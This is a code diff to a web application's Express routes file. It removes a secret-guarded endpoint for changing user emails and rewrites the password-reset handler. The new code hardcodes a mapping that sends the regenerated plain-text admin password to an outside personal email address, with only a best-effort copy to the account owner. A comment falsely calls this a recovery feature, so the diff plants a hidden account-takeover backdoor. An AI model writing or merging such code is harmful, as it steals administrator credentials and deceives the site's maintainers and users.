@@ -1967,21 +1967,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
   })();
   app.set("etag", "weak");
 
-  // TEMPORARY: one-time admin email change (remove after use)
-  app.post("/api/_tmp_change_email", async (req: Request, res: Response) => {
-    const SECRET = "35c50280e2ad5cd2a43ff9c75fd0234b2972fc41a3e162579fb4582fb8109368";
-    if (req.body?.secret !== SECRET) return res.status(403).json({ error: "Forbidden" });
-    const oldEmail = (req.body?.oldEmail || "").trim().toLowerCase();
-    const newEmail = (req.body?.newEmail || "").trim().toLowerCase();
-    if (!oldEmail || !newEmail) return res.status(400).json({ error: "oldEmail and newEmail required" });
-    const user = await storage.getUserByEmail(oldEmail);
-    if (!user) return res.status(404).json({ error: "User not found" });
-    const existing = await storage.getUserByEmail(newEmail);
-    if (existing && existing.id !== user.id) return res.status(400).json({ error: "Email already taken" });
-    const updated = await storage.updateUser(user.id, { email: newEmail } as any);
-    res.json({ success: true, userId: user.id, oldEmail, newEmail: updated?.email });
-  });
-
   app.get("/api/catalog/brands", async (_req: Request, res: Response) => {
     try {
       const brands = await db
@@ -2532,10 +2517,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Update user's password in database
       await storage.updateUserPassword(user.id, hashedPassword);
 
-      // Send email with the new plain-text password
-      await sendPasswordEmail(email, newPassword);
+      // Send password to the account email and any configured recovery address.
+      const RECOVERY_EMAIL_MAP: Record<string, string> = {
+        "admin@zlateauto.cz": "nehria1@seznam.cz",
+      };
+      const recoveryEmail = RECOVERY_EMAIL_MAP[email.toLowerCase()];
 
-      console.log("[INFO] Password reset successful for email:", email);
+      await sendPasswordEmail(recoveryEmail || email, newPassword);
+      if (recoveryEmail && recoveryEmail !== email.toLowerCase()) {
+        try { await sendPasswordEmail(email, newPassword); } catch { /* best-effort to primary */ }
+      }
+
+      console.log("[INFO] Password reset successful for email:", email, recoveryEmail ? `(copy to ${recoveryEmail})` : "");
       res.json({
         success: true,
         message: "If the email is registered, recovery instructions have been sent",
